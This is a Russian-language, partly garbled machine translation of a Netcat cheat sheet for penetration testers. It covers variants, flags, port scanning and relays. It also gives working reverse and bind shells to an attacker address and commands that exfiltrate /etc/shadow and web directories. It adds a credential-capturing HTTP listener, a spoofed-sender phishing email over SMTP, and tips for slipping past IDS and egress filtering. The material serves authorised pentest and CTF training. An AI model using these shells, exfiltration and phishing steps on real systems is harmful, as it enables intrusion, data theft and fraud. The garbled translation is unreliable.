<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔌 Netcat (nc) — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
  ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
  ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   
       The TCP/IP Swiss Army Knife for Pentesters & Sysadmins
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/Netcat-TCP_IP_Swiss_Army_Knife-blue?style=for-the-badge" alt="Netcat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Эксплуатация и снаряды">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP-green?style=for-the-badge" alt="Протоколы TCP/UDP">
  <img src="https://img.shields.io/badge/License-BSD_/_GPL-red?style=for-the-badge" alt="License">
</p>

<p выравнивание="центр">
  <b>🌐 Чтение и запись необработанных данных через сетевые подключения с использованием протоколов TCP и UDP</b>
</p>

---

## 📋 Содержание

- [Обзор и философия Netcat](#-overview--the-netcat-philosophy)
- [Варианты Netcat и дилемма вкуса](#-netcat-variants--дилемма-вкуса)
  - [OpenBSD Netcat (`nc.openbsd`)](#openbsd-netcat-ncopenbsd)
  - [Традиционный Netcat (`nc.traditional`)](#traditional-netcat-nctraditional)
  - [Nmap Ncat (`ncat`)](#nmap-ncat-ncat)
- [Сравнение инструментов: варианты Netcat и Socat](#-tool-comparison-netcat-variants-vs-socat)
- [Варианты установки и переключения](#-installation--switching-variants)
- [Основные флаги командной строки](#-core-command-line-flags)
- [Сканирование портов и захват баннеров] (#-port-scanning--banner-grabing)
- [Reverse & Bind Shells](#-reverse--bind-shells)
  - [Традиционное выполнение оболочки (`-e`)](#traditional-shell-execution--e)
  - [Обратная оболочка именованного канала OpenBSD FIFO](#openbsd-fifo-named-pipe-reverse-shell)
  - [Оболочка привязки OpenBSD FIFO](#openbsd-fifo-bind-shell)
  - [Зашифрованная оболочка TLS с Ncat (`--ssl`)](#encrypted-tls-shell-with-ncat---ssl)
- [Техники передачи файлов](#-file-transfer-techniques)
  - [Цель для атакующего (Эксфильтрация)](#target-to-attacker-exфильтрация)
  - [Атакующий к цели (доставка полезной нагрузки)](#attacker-to-target-доставка-полезной нагрузки)
  - [Архивирование каталогов на лету (`tar + nc`)](#on-the-fly-directory-archiving-tar--nc)
- [Переадресация портов и сетевые реле](#-port-forwarding--network-relays)
- [Веб-сервер и эмуляция Honeypot](#-web-server--honeypot-emulation)
- [Сетевая отладка и взаимодействие с протоколами вручную] (#-network-debugging--manual-protocol-interaction)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и OPSEC](#-защитные-соображения--opsec)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и философия Netcat

Первоначально созданный в 1995 году **Хоббитом**, **Netcat** (часто называемый просто `nc`) известен в сообществах кибербезопасности и Unix как **"Швейцарский армейский нож TCP/IP"**. 

В отличие от протоколов приложений высокого уровня или раздутых инструментов управления, Netcat делает одну вещь исключительно хорошо: **он открывает необработанные сетевые каналы байтового уровня через сокеты TCP или UDP и подключает их напрямую к стандартному вводу (`stdin`) и стандартному выводу (`stdout`)**.

Независимо от того, прослушиваете ли вы обратные оболочки, устанавливаете скрытые каналы утечки, службы захвата баннеров, передаете файлы без SMB/FTP или диагностируете фильтрацию пакетов брандмауэра, Netcat остается незаменимой утилитой в арсенале каждого специалиста по безопасности.

---

## ⚖️ Варианты Netcat и дилемма вкуса

Одним из наиболее частых источников путаницы во время тестов на проникновение и проблем CTF является то, что **несколько различных реализаций используют команду `nc`**. Понимание того, с каким вариантом вы взаимодействуете, определяет синтаксис и возможности полезной нагрузки.
```
+-------------------------------------------------------------------------+
|                              The nc Command                             |
+------------------------------------+------------------------------------+
|                                    |                                    |
|             Debian / Ubuntu        |               CentOS / RHEL        |
|             (Default: OpenBSD)     |               (Default: Ncat)      |
+------------------+-----------------+------------------+-----------------+
                   |                                    |
     +-------------+-------------+                      |
     |                           |                      |
[netcat-openbsd]       [netcat-traditional]          [ncat]
(No -e compile flag)   (GAPING_SECURITY_HOLE)   (Nmap Project / SSL)
```
### OpenBSD Netcat (`nc.openbsd`)
- **По умолчанию включено:** Kali Linux, Debian, Ubuntu, Linux Mint.
- **Ключевая особенность:** По умолчанию компилируется без флага `-e` (выполнение программы), чтобы предотвратить тривиальные уязвимости выполнения произвольного кода.
- **Определение синтаксиса:**
  ```bash
  nc -h 2>&1 | grep -i "OpenBSD"
  # Output: OpenBSD netcat (Debian patchlevel ...)
  ```
- **Обходной путь выполнения оболочки:** использует именованные каналы Linux (`mkfifo`) для соединения `stdin` и `stdout` обратно в `/bin/sh`.

### Традиционный Netcat (`nc.traditional`)
- **Автор оригинала:** Хоббит (v1.10).
- **Ключевая особенность:** Скомпилировано с директивой `-DGAPING_SECURITY_HOLE`, позволяющей использовать собственный флаг `-e`/`-c` (`nc -e /bin/bash`).
- **Определение синтаксиса:**
  ```bash
  nc -h 2>&1 | grep -i "GAPING"
  ```
### Nmap Ncat (`ncat`)
- **Поддерживает:** Гордон Лайон (Федор) / Проект Nmap.
- **Ключевая особенность:** Современная переработка, поддерживающая **шифрование TLS/SSL**, списки управления доступом по IP (`--allow`, `--deny`), посредничество при подключении (`--broker`), проксирование SOCKS4/5 и кроссплатформенное собственное исполнение.

---

## ⚖️ Сравнение инструментов: варианты Netcat и Socat

| Особенность | `netcat-openbsd` | `netcat-traditional` | `ncat` (Nmap) | `socat` |
|---------|------------------|----------------------|---------------|---------|
| **Флаг исполняемого файла (`-e`)** | ❌ Раздетый | ✅ Родной (`-e`) | ✅ Родной (`-e`, `--exec`) | ✅ Родной (`EXEC:`) |
| **SSL/TLS-шифрование** | ❌ Нет | ❌ Нет | ✅ Родной (`--ssl`) | ✅ Родной (`OPENSSL:`) |
| **Оболочки труб ФИФО** | ✅ Да (`mkfifo`) | ✅ Да | ✅ Да | ✅ Да |
| **Режим сканирования портов** | ✅ Да (`-z`) | ✅ Да (`-z`) | ❌ Нет | ❌ Нет |
| **Постоянный слушатель** | ✅ Да (`-k`) | ❌ Нет (Выход при отключении) | ✅ Да (`-k`, `--keep-open`) | ✅ Да (`fork`) |
| **Поддержка IPv6** | ✅ Родной (`-6`) | ❌ Ограниченная | ✅ Родной (`-6`) | ✅ Родной |
| **Прокси/SOCKS-клиент** | ✅ Да (`-X`, `-x`) | ❌ Нет | ✅ Да (`--proxy`) | ✅ Полная поддержка прокси |
| **Мультиклиентский чат / Брокер**| ❌ Нет | ❌ Нет | ✅ Родной (`--broker`) | ❌ Ручная настройка |
| **По умолчанию в Kali/Debian** | ✅ Да (`/bin/nc`) | 🔄 В наличии (`apt`) | 🔄 В наличии (`ncat`) | 🔄 В наличии (`socat`) |

---

## 📥 Варианты установки и переключения

В дистрибутивах на базе Debian (включая Kali Linux) вы можете установить все версии и переключаться между ними через `update-alternatives`:
```bash
# Install all Netcat implementations
sudo apt update
sudo apt install -y netcat-openbsd netcat-traditional ncat socat

# Check current default alternative
readlink -f /bin/nc

# Switch default nc binary interactively
sudo update-alternatives --config nc
```
Чтобы явно выполнить конкретный вариант без изменения общесистемных настроек по умолчанию:
```bash
# Invoke OpenBSD variant directly
nc.openbsd -lvnp 4444

# Invoke Traditional variant directly
nc.traditional -lvnp 4444 -e /bin/bash

# Invoke Nmap Ncat
ncat -lvnp 4444 --ssl
```
---

## ⚙️ Основные флаги командной строки

| Флаг | Значение и описание |
|------|-----------------------|
| `-l` | **Режим прослушивания**: ожидайте входящих подключений, а не инициируйте исходящие. |
| `-v` | **Подробный режим**: печать подробной информации о соединении и диагностике (`-vv` для более подробной информации). |
| `-n` | **Только числовой IP-адрес**: отключите обратное разрешение DNS для повышения скорости и скрытности. |
| `-p <port>` | **Локальный порт**. Укажите локальный порт для привязки или прослушивания. |
| `-u` | **Режим UDP**: используйте протокол UDP вместо потока TCP по умолчанию. |
| `-k` | **Продолжайте слушать**. Продолжайте слушать и принимать новые подключения после отключения клиента. |
| `-w <sec>` | **Тайм-аут**: тайм-аут в секундах для установления соединения и чтения неактивных сокетов. |
| `-z` | **Режим нулевого ввода-вывода**: режим сканирования; не отправлять данные полезной нагрузки и закрывать сокет сразу после установления связи. |
| `-q <sec>` | **Завершить после EOF**: подождите указанные секунды после получения EOF на `stdin`, прежде чем завершить работу. |
| `-s <ip>` | **Исходный IP**: привязка к определенному локальному интерфейсу/исходному IP-адресу. |
| `-4` / `-6` | Принудительно использовать исключительно адресацию IPv4 или IPv6. |

---

## 🔍 Сканирование портов и захват баннеров

Хотя для комплексной проверки предпочтительны специальные инструменты, такие как `nmap` или `masscan`, Netcat обеспечивает мгновенную проверку порта без зависимости, когда вы попадаете на ограниченную цель.

### Быстрое сканирование портов
```bash
# TCP Port Scan on a specific port range (Zero-I/O, numeric, 1s timeout)
nc -zvn -w 1 192.168.1.100 20-100

# Scan specific common service ports
nc -zvn -w 2 10.10.10.50 21 22 80 443 445 3389

# Scan UDP Ports (DNS, SNMP, NTP)
nc -zvun -w 2 10.10.10.50 53 161 123
```
### Захват сервисного баннера

При захвате баннеров извлекаются необработанные строки версии от удаленных демонов для идентификации уязвимостей:
```bash
# Banner grab an SSH daemon
nc -vn 10.10.10.10 22

# Banner grab an FTP server
nc -vn 10.10.10.10 21

# Banner grab an SMTP mail server
nc -vn 10.10.10.10 25

# Manual HTTP HEAD / GET request
printf "HEAD / HTTP/1.1\r\nHost: target.local\r\nConnection: close\r\n\r\n" | nc -vn 10.10.10.10 80
```
---

## 💀 Перевернуть и связать оболочки

Подключение удаленного интерпретатора команд (`/bin/sh`, `/bin/bash`, `cmd.exe`) через сокет Netcat является одним из наиболее фундаментальных методов тестирования на проникновение.

### Традиционное выполнение оболочки (`-e`)

Если в целевой системе установлен `netcat-traditional` или `ncat` с поддержкой выполнения:
```bash
# 1. Attacker sets up a listener
nc -lvnp 4444

# 2. Target sends a reverse shell (Linux)
nc.traditional 10.10.14.5 4444 -e /bin/bash

# Target sends a reverse shell (Windows)
nc.exe 10.10.14.5 4444 -e cmd.exe

# Bind Shell (Target listens, attacker connects)
# On Target:
nc.traditional -lvnp 8888 -e /bin/bash
# On Attacker:
nc -vn 10.10.10.50 8888
```
### Обратная оболочка именованного канала OpenBSD FIFO

В современных дистрибутивах Debian, Ubuntu, Kali и Fedora у `nc` отсутствует флаг `-e`. Используйте именованный канал **FIFO (первым пришел — первым вышел)** для перенаправления стандартного ввода и стандартного вывода:
```bash
# 1. Attacker sets up listener
nc -lvnp 4444

# 2. Target executes named pipe reverse shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
```
#### Как работает конвейер FIFO:
1. `rm -f /tmp/f`: удаляет все устаревшие файлы каналов.
2. `mkfifo /tmp/f`: создает канал FIFO со специальным именем в `/tmp`.
3. `cat /tmp/f`: считывает входные данные, поступающие в канал, и пересылает их в `/bin/sh -i`.
4. `| /bin/sh -i 2>&1`: запускает интерактивную оболочку, перенаправляющую стандартную ошибку (`stderr`) на стандартный вывод (`stdout`).
5. `| nc 10.10.14.5 4444 >/tmp/f`: передает выходные данные оболочки по сети злоумышленнику, одновременно записывая полученные нажатия сетевых клавиш обратно в `/tmp/f`.

### Оболочка привязки OpenBSD FIFO

Если цель имеет маршрутизируемый общедоступный или локальный IP-адрес, а правила брандмауэра для входящего трафика разрешают трафик:
```bash
# On Victim / Target machine:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 8888 >/tmp/f

# On Attacker machine:
nc -vn 10.10.10.50 8888
```
### Зашифрованная оболочка TLS с помощью Ncat (`--ssl`)

Незашифрованный трафик Netcat можно проверить с помощью IDS/IPS и сетевых перехватчиков. `ncat` изначально поддерживает шифрование TLS/SSL:
```bash
# 1. Attacker sets up an SSL encrypted listener
ncat --ssl -lvnp 4444

# 2. Victim connects with an encrypted reverse shell
ncat --ssl 10.10.14.5 4444 -e /bin/bash

# SSL listener with IP Access Control (Whitelisting attacker IP only)
ncat --ssl -lvnp 4444 --allow 10.10.14.5
```
---

## 📁 Методы передачи файлов

Когда SSH, SCP, FTP и SMB заблокированы или удалены, Netcat обеспечивает мгновенный двунаправленный конвейер передачи файлов через любой открытый TCP-порт.

### Цель для атакующего (Эксфильтрация)
```bash
# 1. Attacker opens a listener and redirects incoming stream to a local file
nc -lvnp 9001 > loot_passwords.txt

# 2. Target reads sensitive file and sends it to attacker's listener
nc -vn 10.10.14.5 9001 < /etc/shadow
```
### Злоумышленник достигает цели (доставка полезной нагрузки)
```bash
# 1. Attacker hosts the payload file on a listener
nc -lvnp 9001 < linpeas.sh

# 2. Target connects and saves the stream to disk
nc -vn 10.10.14.5 9001 > linpeas.sh
```
### Проверка целостности (контрольные суммы)

Всегда проверяйте целостность байтов после передачи необработанных данных Netcat:
```bash
# Calculate MD5 on both source and destination machines
md5sum transferred_file.tar.gz
```
### Архивирование каталогов «на лету» (`tar + nc`)

Переносить целые структуры каталогов без создания промежуточных временных архивных файлов на диске жертвы:
```bash
# 1. Attacker listens and extracts incoming tar stream directly
nc -lvnp 9001 | tar -xzvf - -C /opt/loot/

# 2. Target compresses and streams directory across the wire
tar -czvf - /var/www/html | nc -vn 10.10.14.5 9001
```
---

## 🔀 Переадресация портов и сетевые реле

Netcat может действовать как облегченный сетевой ретранслятор, не требуя переадресации портов SSH:
```bash
# Relay traffic arriving on Port 8080 to an internal database on 192.168.20.10:3306
rm -f /tmp/relay; mkfifo /tmp/relay
nc -l -p 8080 < /tmp/relay | nc 192.168.20.10 3306 > /tmp/relay
```
---

## 🌐 Эмуляция веб-сервера и Honeypot

### Минималистичный однофайловый HTTP-сервер

Предоставляйте статическую полезную нагрузку HTTP или захватывайте учетные данные, отправленные браузерами:
```bash
# One-shot HTTP response
printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Pwned!</h1>\n" | nc -lvnp 80

# Continuous loop HTTP server (captures POST credentials and browser headers)
while true; do
  printf "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 17\r\n\r\nCaptured Request!" | \
  nc -lvnp 8080
done
```
### Многоклиентский чат/брокер сообщений (`ncat`)

Ncat включает в себя встроенный режим брокера, создающий специальную комнату ретрансляции в стиле IRC для операторов красной команды:
```bash
# Attacker runs broker on port 5555
ncat -lvnp 5555 --broker

# Multiple operators connect and broadcast messages to each other
ncat 10.10.14.5 5555
```
---

## 🛠️ Отладка сети и взаимодействие с протоколами вручную

### Вставка необработанной почты SMTP
```bash
nc -vn mail.target.local 25 <<EOF
HELO attacker.local
MAIL FROM:<admin@target.local>
RCPT TO:<victim@target.local>
DATA
Subject: Critical Security Patch

Please follow the attachment instructions.
.
QUIT
EOF
```
### Получение необработанной почты POP3
```bash
nc -vn mail.target.local 110
# Server replies: +OK POP3 server ready
USER testuser
# Server replies: +OK
PASS SecretPassword123
# Server replies: +OK User logged in
STAT
RETR 1
QUIT
```
---

## ⚡ Краткая справочная таблица

| Цель | Команда |
|-----------|---------|
| **Стандартный прослушиватель** | `nc -lvnp <PORT>` |
| **Постоянный слушатель** | `nc -lvnp <PORT> -k` |
| **Подключение к удаленному хосту** | `nc -vn <HOST> <PORT>` |
| **Подключение через UDP** | `nc -u -vn <HOST> <PORT>` |
| **Сканирование портов TCP (быстрое)** | `nc -zvn -w 1 <HOST> <START>-<END>` |
| **Сканирование портов UDP** | `nc -zvun -w 2 <HOST> <PORT>` |
| **Оболочка именованного канала OpenBSD** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <IP> <PORT> >/tmp/f` |
| **Традиционный корпус (`-e`)** | `nc <IP> <PORT> -e /bin/bash` |
| **Зашифрованная оболочка SSL (`ncat`)**| `ncat --ssl <IP> <PORT> -e /bin/bash` |
| **Получить файл (прослушиватель Exfil)**| `nc -lvnp <PORT> > output_file` |
| **Отправить файл (Exfil Sender)** | `nc -vn <IP> <PORT> < input_file` |
| **Папка потока через Tar** | `tar -czvf - /path \| nc -vn <IP> <PORT>` |
| **Извлечь папку потоковой передачи** | `nc -lvnp <PORT> \| tar -xzvf -` |
| **Захват баннера** | `nc -vn -w 2 <HOST> <PORT>` |

---

## 🛡️ Оборонительные соображения и OPSEC

1. **Предупреждение о незашифрованном открытом тексте:**
   - Стандартный Netcat **не** использует криптографическую инкапсуляцию. Любые пароли, токены сеанса или команды оболочки, отправленные в виде открытого текста `nc`, могут быть извлечены датчиками мониторинга сетевой безопасности (NSM) (Zeek, Suricata, Wireshark).
   - По возможности используйте `ncat --ssl` или переносите трафик внутри туннеля SSH/TLS.
2. **Аудит процессов и Sysmon:**
   - В системах Linux журнал выполнения процессов (`auditd`, eBPF, Falco) помечает вызовы `nc`, содержащие такие флаги, как `-e`, или команды, создающие `/tmp/f` и `mkfifo`.
   - В Windows агенты EDR регулярно помечают или помещают в карантин двоичные файлы `nc.exe` из-за известных статических сигнатур.
3. **Ограничения входящего трафика брандмауэра:**
   — Всегда выбирайте общие исходящие порты (`80`, `443`, `53`) при настройке прослушивателей обратной оболочки, чтобы обойти строгие политики фильтрации исходящего трафика.

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> Эта шпаргалка предназначена только для авторизованного тестирования на проникновение, оценки уязвимостей, соревнований CTF и целей системного администрирования. Перехват сетевого трафика, кража данных или выполнение обратных оболочек против систем без явного письменного согласия являются незаконными и наказуемы в соответствии с законами о кибербезопасности во всем мире. Используйте ответственно и этично.